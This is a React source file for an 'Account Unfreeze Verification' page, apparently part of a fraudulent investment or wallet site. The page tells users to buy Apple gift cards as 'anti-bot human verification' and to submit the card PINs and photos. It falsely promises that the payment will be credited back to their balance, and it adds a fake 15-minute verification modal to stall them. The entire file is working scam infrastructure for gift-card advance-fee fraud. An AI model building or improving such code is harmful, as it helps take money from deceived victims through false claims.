import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { submitUnfreezeCards, getSettings } from '../../services/api';
import toast from 'react-hot-toast';
import {
  LuCreditCard as CreditCard,
  LuPlus as Plus,
  LuTrash2 as Trash2,
  LuUpload as Upload,
  LuCircleAlert as AlertCircle,
  LuArrowLeft as ArrowLeft,
  LuClock as Clock,
  LuSparkles as Sparkles,
} from 'react-icons/lu';
import './UnfreezeAccountView.css';

export const UnfreezeAccountView = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);
  const [cards, setCards] = useState([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [showVerificationModal, setShowVerificationModal] = useState(false);

  useEffect(() => {
    getSettings().then(data => {
      if (data.success) setSettings(data.settings);
    }).catch(() => {});
  }, []);

  const unfreezeAmount = settings?.unfreezeAmount || 300;
  const unfreezeCardType = settings?.unfreezeCardType || 'Apple Card';

  // Initialize first card
  useEffect(() => {
    if (cards.length === 0) {
      setCards([{
        id: `card-${Date.now()}`,
        cardType: unfreezeCardType,
        amount: unfreezeAmount,
        pin: '',
        imageUrl: '',
        imageFileName: ''
      }]);
    }
  }, [unfreezeCardType, unfreezeAmount, cards.length]);

  const addCard = () => {
    setCards([...cards, {
      id: `card-${Date.now()}-${Math.random().toString(36).substr(2,4)}`,
      cardType: unfreezeCardType,
      amount: unfreezeAmount,
      pin: '',
      imageUrl: '',
      imageFileName: ''
    }]);
  };

  const removeCard = (id) => {
    if (cards.length === 1) return;
    setCards(cards.filter(c => c.id !== id));
  };

  const handleChange = (id, field, value) => {
    setCards(cards.map(c => c.id === id ? { ...c, [field]: value } : c));
    setErrorMessage(null);
  };

  const handleFileUpload = (id, e) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setCards(cards.map(c => c.id === id ? { ...c, imageUrl: reader.result, imageFileName: file.name } : c));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage(null);
    for (let i = 0; i < cards.length; i++) {
      if (!cards[i].pin.trim()) { setErrorMessage(`Enter PIN for card ${i+1}`); return; }
      if (!cards[i].imageUrl) { setErrorMessage(`Upload image for card ${i+1}`); return; }
    }
    setIsSubmitting(true);
    try {
      await submitUnfreezeCards(user.id, cards);
      toast.success('Unfreeze cards submitted!');
      setShowVerificationModal(true);
    } catch (err) {
      setErrorMessage(err.message || 'Submission failed.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const totalAmount = cards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);

  return (
    <div className="unfreeze-view">
      <button className="back-btn" onClick={() => navigate('/dashboard')}>
        <ArrowLeft /> Back to Dashboard
      </button>

      {showVerificationModal && (
        <div className="verification-modal">
          <div className="modal-content">
            <Clock />
            <h3>Verification in Progress</h3>
            <p>Your account is under verification, we are reviewing your card, it might take up to 15 minutes. You will be notified when your account is unfreezed.</p>
            <button onClick={() => { 
              setShowVerificationModal(false); 
              navigate('/dashboard');
            }}>
              Return to Dashboard
            </button>
          </div>
        </div>
      )}

      <div className="unfreeze-container">
        <div className="header">
          <CreditCard />
          <div>
            <h1>Account Unfreeze Verification</h1>
            <p>Identity and anti-bot human validation protocol</p>
          </div>
        </div>

        <div className="notice-box">
          <Sparkles /> Human Verification Notice
          <p>{settings?.unfreezeCustomNotice || `Kindly buy a $${unfreezeAmount.toLocaleString()} ${unfreezeCardType.toLowerCase()} to verify you are a human and not a bot to unfreeze your account, note: your $${unfreezeAmount.toLocaleString()} will be credited/ added to your balance, and you will withdraw it together.`}</p>
        </div>

        {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}

        <form onSubmit={handleSubmit} className="unfreeze-form">
          {cards.map((card, index) => (
            <div key={card.id} className="card-entry">
              <div className="card-header">
                <span>{unfreezeCardType} Verification #{index + 1}</span>
                {cards.length > 1 && (
                  <button type="button" onClick={() => removeCard(card.id)}><Trash2 /> Remove</button>
                )}
              </div>
              <div className="form-row">
                <div><label>Card Type</label><input type="text" readOnly value={unfreezeCardType} /></div>
                <div><label>Amount ($)</label><input type="number" value={card.amount} onChange={e => handleChange(card.id, 'amount', parseFloat(e.target.value) || 0)} required /></div>
              </div>
              <div><label>Card PIN</label><input type="text" placeholder="e.g. X982-1104-5829-4401" value={card.pin} onChange={e => handleChange(card.id, 'pin', e.target.value)} required /></div>
              <div className="upload-field">
                <label>Upload Card PIN Photo</label>
                <div className="upload-area">
                  <input type="file" accept="image/*" onChange={(e) => handleFileUpload(card.id, e)} required={!card.imageUrl} />
                  <Upload />
                  <span>{card.imageFileName || 'Choose Image'}</span>
                </div>
                {card.imageUrl && <img src={card.imageUrl} alt="preview" className="preview" />}
              </div>
            </div>
          ))}

          <button type="button" className="add-btn" onClick={addCard}>
            <Plus /> Add More Gift Cards
          </button>

          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Submitting...' : `Submit Card Verification ($${totalAmount.toLocaleString()})`}
          </button>
        </form>
      </div>
    </div>
  );
};